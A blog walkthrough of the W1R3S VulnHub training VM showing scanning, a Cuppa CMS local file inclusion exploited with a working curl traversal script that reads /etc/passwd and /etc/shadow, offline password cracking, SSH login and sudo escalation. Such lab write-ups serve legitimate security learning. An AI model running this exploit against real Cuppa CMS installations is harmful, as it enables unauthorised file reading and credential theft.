---
layout: post
title: "Ghost in the Wires"
category: Walkthrough
tags: [VulnHub, W1R3S]
comments: true
image:
  feature: ghosts.jpg
  credit: Alexas_Fotos / Pixelbay
  creditlink: https://pixabay.com/en/halloween-ghosts-happy-halloween-1746354/
---

This post documents the complete walkthrough of W1R3S: 1.0.1, a boot2root [VM][1] created by SpecterWires and hosted at [VulnHub][2]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain `root` access and find the flag (located in `/root` directory).

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host:

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.100.130
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23 11:21 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23 11:25 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28 16:53 new-employees
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|_  256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   syn-ack ttl 64 MySQL (unauthorized)
```

As usual, let's go with directory/file enumeration on the web service and see what we get.

### Directory/File Enumeration

I've always like to use `gobuster` with one of the big directory wordlists.

```
Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.100.130/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
http://192.168.100.130/administrator (Status: 301)
http://192.168.100.130/javascript (Status: 301)
http://192.168.100.130/wordpress (Status: 301)
=====================================================
```

OK. We have two interesting directories: `administrator` and `wordpress`.

### Cuppa CMS

The `administrator` directory turned out to be the installation setup for Cuppa CMS. This is how it looked like when the browser was pointed to `/administrator`.

![screenshot-1](/assets/images/posts/w1r3s-walkthrough/screenshot-1.png)

According to the official [documentation](https://www.cuppacms.com/en/docs/installation){:target="_blank"}, in order for the installation to be completed, the database has to be created first.

>On step 2, configure the database and user administrator setting and click in next. Remember, the database should be created before to install Cuppa CMS.

The Cuppa CMS installation was never completed in the first place or I'll not be seeing the setup page. Suffice to say, I downloaded a [copy](http://cuppacms.com/files/cuppa_cms.zip){:target="_blank"} of the Cuppa CMS code to see if I can discover any vulnerabilities.

It was certainly a pleasant surprise when I found one. I'm not sure if this is a new vulnerability but there is a LFI vulnerability with `alertConfigField.php` at line 77.

![screenshot-2](/assets/images/posts/w1r3s-walkthrough/screenshot-2.png)

To test it, I wrote `cat.sh`, an extremely simple script that will display any file as long as there is permission to do so.

{% highlight bash linenos %}
#!/bin/bash

_HOST=192.168.100.130
_PATH=administrator/alerts/alertConfigField.php
_PARM=urlConfig
_TRAV=../../../../../../../..

curl -s --data-urlencode "${_PARM}=${_TRAV}$1" $_HOST/$_PATH \
| sed -r 's/^ {8}//' \
| sed '71,$!d' \
| sed '$d' \
| sed '$d'
{% endhighlight %}

Let's give it a shot and see what we get.

```
# ./cat.sh /etc/passwd
...
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
```
Imagine my surprise when I requested for `/etc/shadow` and it showed up in the output.

```
# ./cat.sh /etc/shadow
...
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
```

I'm not quite sure if `/etc/shadow` was intentionally made world-readable which should not be the case.

### John the Ripper

Well, what's done is done. With both `passwd` and `shadow` made available, I can `unshadow` them and send them to JtR for offline cracking with a password list like "rockyou".

The cracking was completed in seconds.

```
# john --format=crypt --show hashes.txt 
w1r3s:computer:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
```

With the password of `w1r3s` made available, I can simply login to the box via SSH.

![screenshot-3](/assets/images/posts/w1r3s-walkthrough/screenshot-3.png)

### Privilege Escalation

It wasn't long before I saw that `w1r3s` is on the `sudoers` list.

![screenshot-4](/assets/images/posts/w1r3s-walkthrough/screenshot-4.png)

Becoming `root` is just one command away.

![screenshot-5](/assets/images/posts/w1r3s-walkthrough/screenshot-5.png)

:dancer:

### Afterthought

Frankly, I didn't even bother with WordPress. :stuck_out_tongue_winking_eye:

[1]: https://www.vulnhub.com/entry/w1r3s-101,220/
[2]: https://www.vulnhub.com

*[LFI]: Local File Inclusion